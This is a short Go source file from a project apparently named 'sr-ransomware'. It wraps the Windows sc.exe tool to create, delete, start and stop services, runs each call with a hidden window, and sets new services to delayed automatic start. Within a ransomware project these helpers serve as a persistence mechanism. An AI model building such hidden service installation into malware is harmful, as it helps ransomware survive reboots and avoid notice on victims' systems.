// +build windows

package win

import (
    "fmt"

    "github.com/sug0/sr-ransomware/go/errors"
)

func InstallService(name, display, executable string) error {
    scArgs := fmt.Sprintf(
        "create %s DisplayName= %s start= delayed-auto binPath= %s",
        name,
        display,
        executable,
    )
    err := ShellExecute("open", "sc.exe", scArgs, SW_HIDE)
    return errors.WrapIfNotNil(pkg, "failed to install service", err)
}

func RemoveService(name string) error {
    err := ShellExecute("open", "sc.exe", "delete " + name, SW_HIDE)
    return errors.WrapIfNotNil(pkg, "failed to remove service", err)
}

func StartService(name string) error {
    err := ShellExecute("open", "sc.exe", "start " + name, SW_HIDE)
    return errors.WrapIfNotNil(pkg, "failed to start service", err)
}

func StopService(name string) error {
    err := ShellExecute("open", "sc.exe", "stop " + name, SW_HIDE)
    return errors.WrapIfNotNil(pkg, "failed to stop service", err)
}
